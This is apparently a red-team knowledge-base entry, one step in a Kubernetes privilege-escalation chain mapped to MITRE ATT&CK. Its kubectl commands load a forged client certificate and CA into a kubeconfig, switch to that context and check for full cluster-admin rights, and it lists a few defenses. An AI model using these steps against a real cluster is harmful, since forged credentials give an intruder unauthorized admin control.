---
id: proc-5
name: Configure-Forged-Kubeconfig-and-Verify-Admin-Access
tags:
  - kubernetes
  - rbac
  - admin-escalation
type: procedure
tools:
  - '[[tools/kubectl]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/export-kubeconfig]]'
  - '[[commands/kubectl-config-set-credentials]]'
  - '[[commands/kubectl-config-set-cluster]]'
  - '[[commands/kubectl-config-set-context]]'
  - '[[commands/kubectl-config-use-context]]'
  - '[[commands/kubectl-auth-can-i]]'
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[External Remote Services]]'
updated_at: '2025-12-14T17:30:18.568Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[External Remote Services]]'
---
# Configure-Forged-Kubeconfig-and-Verify-Admin-Access

## Summary

Constructs a kubeconfig file using the forged certificate and verifies full cluster-admin access via RBAC check.

## Description

This procedure sets up a custom kubeconfig with the forged client cert/key and CA, points to the API server, and tests authorization for all actions, confirming escalation to cluster admin.

## Requirements

1. user.pem, user-key.pem, ca.pem generated
2. kubectl installed
3. API server URL known (https://<kops-ip>:6443)

## Defense

- Enforce mTLS and validate cert chains strictly
- Use OIDC or webhook auth instead of x509
- Log and alert on new kubeconfig contexts

## Objectives

1. Build valid kubeconfig for forged identity
2. Switch to admin context
3. Confirm unrestricted access

## Instructions

### Step 1: Set Kubeconfig File

**Context**: Point kubectl to custom config.

**Command** ([[commands/export-kubeconfig]]):
```bash
export KUBECONFIG=./pwn.kconfig
```

> Sets env. Expected output: Variable exported.

### Step 2: Set Credentials

**Context**: Add forged client cert/key.

**Command** ([[commands/kubectl-config-set-credentials]]):
```bash
k config set-credentials pwn --client-certificate=user.pem --client-key=user-key.pem
```

> Updates config. Expected output: Credentials set.

### Step 3: Set Cluster

**Context**: Define cluster with CA and server.

**Command** ([[commands/kubectl-config-set-cluster]]):
```bash
k config set-cluster kops --certificate-authority=ca.pem --server=https://<kops-ip>
```

> Updates cluster. Expected output: Cluster set.

### Step 4: Set Context

**Context**: Link user and cluster.

**Command** ([[commands/kubectl-config-set-context]]):
```bash
k config set-context pwn@kops --cluster=kops --user=pwn
```

> Creates context. Expected output: Context set.

### Step 5: Use Context

**Context**: Activate the forged config.

**Command** ([[commands/kubectl-config-use-context]]):
```bash
k config use-context pwn@kops
```

> Switches. Expected output: Context active.

### Step 6: Verify Admin Access

**Context**: Check RBAC permissions.

**Command** ([[commands/kubectl-auth-can-i]]):
```bash
k auth can-i '*' '*' -A
```

> Tests all. Expected output: 'yes'.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[External Remote Services]] External Remote Services

### Sub-Techniques

- None

## Commands Used

- [[commands/export-kubeconfig]]
- [[commands/kubectl-config-set-credentials]]
- [[commands/kubectl-config-set-cluster]]
- [[commands/kubectl-config-set-context]]
- [[commands/kubectl-config-use-context]]
- [[commands/kubectl-auth-can-i]]

## Tools Used

- [[tools/kubectl]]

## Tags

- kubernetes
- rbac
- admin-escalation
